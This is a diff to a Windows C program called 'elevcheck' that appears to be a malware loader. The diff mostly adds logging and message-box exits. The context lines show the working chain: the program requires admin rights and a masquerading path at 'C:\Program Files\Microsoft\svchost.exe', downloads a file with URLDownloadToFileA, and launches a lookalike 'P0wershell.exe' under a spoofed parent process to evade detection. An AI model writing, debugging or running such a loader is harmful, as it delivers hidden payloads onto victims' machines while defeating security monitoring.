@@ -6,21 +6,30 @@
 
 BOOL WINAPI IsUserAnAdmin(void);
 
-static void press_exit(int code) {
-    printf("\n[=] elevcheck exiting (%d). Press any key to close...\n", code);
-    Sleep(200);
-    _getch();
+static void log_msg(const char* msg) {
+    FILE* f = fopen("C:\\elevcheck.log", "a");
+    if (f) { fprintf(f, "%s\n", msg); fclose(f); }
+}
+
+static void press_exit(int code, const char* why) {
+    char buf[256];
+    snprintf(buf, sizeof(buf), "elevcheck exiting (%d)\n%s", code, why ? why : "");
+    log_msg(buf);
+    MessageBoxA(NULL, buf, "elevcheck", MB_OK | MB_ICONINFORMATION);
     exit(code);
 }
 
 int main(void) {
+    DeleteFileA("C:\\elevcheck.log");
+    log_msg("[+] elevcheck started");
+
     if (!IsUserAnAdmin())
-        press_exit(1);
+        press_exit(1, "[-] Not running as admin.");
 
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
     if (lstrcmpiA(path, "C:\\Program Files\\Microsoft\\svchost.exe") != 0)
-        press_exit(1);
+        press_exit(1, "[-] Not running from expected path.");
 
     printf("[+] Running in Elevated Session.\n");
 
@@ -54,7 +63,7 @@ int main(void) {
 
     if (targetPID == 0) {
         printf("[-] No valid process found for PPID spoofing.\n");
-        press_exit(1);
+        press_exit(1, "[-] No valid process found for PPID spoofing.");
     }
     printf("[+] Using %s (PID: %lu) as spoofed parent\n", targetName, targetPID);
 
@@ -65,15 +74,16 @@ int main(void) {
     HRESULT hr = URLDownloadToFileA(NULL, url, outPath, 0, NULL);
     if (hr != S_OK) {
         printf("[-] Download failed (HRESULT: 0x%lx).\n", hr);
-        press_exit(1);
+        press_exit(1, "[-] P0wershell.exe download failed.");
     }
     printf("[+] Download complete.\n");
+    log_msg("[+] P0wershell.exe download complete");
 
     // PPID spoofing via CreateProcess attribute
     HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, targetPID);
     if (!hParent) {
         printf("[-] Failed to open target process (%lu)\n", GetLastError());
-        press_exit(1);
+        press_exit(1, "[-] Failed to open spoofed parent process.");
     }
     printf("[+] Opened target process handle\n");
 
@@ -83,14 +93,14 @@ int main(void) {
     if (!attrList) {
         printf("[-] HeapAlloc failed\n");
         CloseHandle(hParent);
-        press_exit(1);
+        press_exit(1, "[-] HeapAlloc failed.");
     }
 
     if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
         printf("[-] InitializeProcThreadAttributeList failed (%lu)\n", GetLastError());
         HeapFree(GetProcessHeap(), 0, attrList);
         CloseHandle(hParent);
-        press_exit(1);
+        press_exit(1, "[-] InitializeProcThreadAttributeList failed.");
     }
 
     if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
@@ -98,9 +108,10 @@ int main(void) {
         DeleteProcThreadAttributeList(attrList);
         HeapFree(GetProcessHeap(), 0, attrList);
         CloseHandle(hParent);
-        press_exit(1);
+        press_exit(1, "[-] UpdateProcThreadAttribute failed.");
     }
     printf("[+] PPID attribute set\n");
+    log_msg("[+] PPID attribute set, about to CreateProcess P0wershell.exe");
 
     STARTUPINFOEXA si = { .StartupInfo = { .cb = sizeof(STARTUPINFOEXA) }, .lpAttributeList = attrList };
     PROCESS_INFORMATION pi;
@@ -109,7 +120,7 @@ int main(void) {
         DeleteProcThreadAttributeList(attrList);
         HeapFree(GetProcessHeap(), 0, attrList);
         CloseHandle(hParent);
-        press_exit(1);
+        press_exit(1, "[-] CreateProcess of P0wershell.exe failed.");
     }
     printf("[+] P0wershell.exe launched (PID: %lu) — waiting for completion\n", pi.dwProcessId);
     CloseHandle(pi.hThread);
@@ -120,5 +131,5 @@ int main(void) {
 
     WaitForSingleObject(pi.hProcess, INFINITE);
     CloseHandle(pi.hProcess);
-    press_exit(0);
+    press_exit(0, "[+] Chain completed.");
 }
